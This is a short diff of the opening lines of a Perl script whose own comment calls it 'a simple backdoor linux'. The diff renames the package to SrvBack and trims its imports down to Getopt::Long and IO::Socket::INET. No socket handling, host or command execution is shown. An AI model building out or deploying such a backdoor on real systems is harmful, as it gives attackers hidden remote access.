@@ -1,20 +1,10 @@
 #!/bin/perl
 # perl version : 5.30
 # Description : This is a simple backdoor linux
-package PerlForing;
+package SrvBack;
 
-use warnings;
-use strict;
-use safe;
 use Getopt::Long;
-use Time::Hires;
-use Time::Seconds;
-use utf8;
-use threads;
 use IO::Socket::INET;
-
-use FindBin qw($Bin);    # locate this script
-use lib "$Bin/";
 
 Getopt::Long::Configure('bundling');
 
